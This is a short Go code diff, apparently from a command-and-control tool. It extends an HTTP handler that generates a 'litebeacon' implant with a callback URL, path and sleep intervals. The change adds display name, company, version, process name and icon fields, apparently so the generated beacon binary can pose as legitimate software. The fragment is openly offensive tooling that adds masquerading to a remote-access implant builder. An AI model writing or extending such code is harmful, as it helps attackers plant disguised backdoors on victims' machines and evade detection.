@@ -15,6 +15,12 @@ func (s *Service) generateC(w http.ResponseWriter, r *http.Request) {
 		Path    string `json:"path"`
 		IdleSec int    `json:"idleSec"`
 		FastSec int    `json:"fastSec"`
+
+		DisplayName string `json:"displayName"`
+		Company     string `json:"company"`
+		Version     string `json:"version"`
+		ProcName    string `json:"procName"`
+		IconB64     string `json:"iconB64"`
 	}
 	if err := decodeJSON(r, &body); err != nil {
 		writeErr(w, http.StatusBadRequest, "生成参数不合法")
@@ -23,6 +29,8 @@ func (s *Service) generateC(w http.ResponseWriter, r *http.Request) {
 	name, data, err := litebeacon.Build(litebeacon.BuildRequest{
 		Name: body.Name, OS: body.OS, Arch: body.Arch,
 		URL: body.URL, Path: body.Path, IdleSec: body.IdleSec, FastSec: body.FastSec,
+		DisplayName: body.DisplayName, Company: body.Company, Version: body.Version,
+		ProcName: body.ProcName, IconB64: body.IconB64,
 	})
 	if err != nil {
 		writeErr(w, http.StatusBadRequest, err.Error())
